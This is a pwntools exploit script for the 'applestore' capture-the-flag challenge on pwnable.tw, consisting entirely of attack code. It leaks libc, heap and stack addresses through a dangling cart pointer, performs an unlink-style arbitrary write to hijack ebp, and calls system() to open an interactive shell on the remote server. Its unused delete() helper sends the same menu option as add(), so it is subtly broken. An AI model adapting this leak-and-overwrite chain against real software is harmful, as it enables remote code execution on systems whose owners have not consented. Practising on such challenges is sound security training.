from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
    p = process('./applestore')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('chall.pwnable.tw', 10104)
    libc = ELF('libc_32.so.6')

elf = ELF('./applestore')

def add(idx):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('Number>')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('Number>')
    p.sendline(str(idx))

def leak(addr):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('(y/n) >')
    p.sendline('y\x00' + p32(addr) + '\x00' * 4 * 2)
    p.recvuntil('27:')
    leak_addr = u32(p.recvline()[1:5].ljust(4, '\x00'))
    return leak_addr

def aaw(addr, target):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('>')
    p.sendline('27' + '\x00' * 4 * 2 + p32(addr - 0xc) + p32(target))

for i in range(6):
    add(1)
for i in range(20):
    add(2)
#checkout
#gdb.attach(p)
p.recvuntil('>')
p.sendline('5')
p.recvuntil('(y/n) >')
p.sendline('y')
#cart leak libc
#gdb.attach(p)
print_addr = leak(elf.got['printf'])
libc_base = print_addr - libc.symbols['printf']
log.info('libc_addr:' + hex(libc_base))

heap_addr = leak(0x0804B068 + 8)
log.info('heap:' + hex(heap_addr))
#gdb.attach(p)
stack_addr = leak(heap_addr + 0x4a0)
log.info('stack:' + hex(stack_addr))

#control the ebp
aaw(stack_addr + 0x20, stack_addr + 0x40)

p.recvuntil('>')
#p.sendline('6\x00' + p32(stack_addr) + p32(libc_base + libc.symbols['system']) + p32(stack_addr) + p32(libc_base + 0x15ba0b))
p.sendline('6\x00' + p32(stack_addr) + p32(libc_base + libc.symbols['system']) + p32(stack_addr) + p32(libc_base + 0x158e8b))

p.interactive()
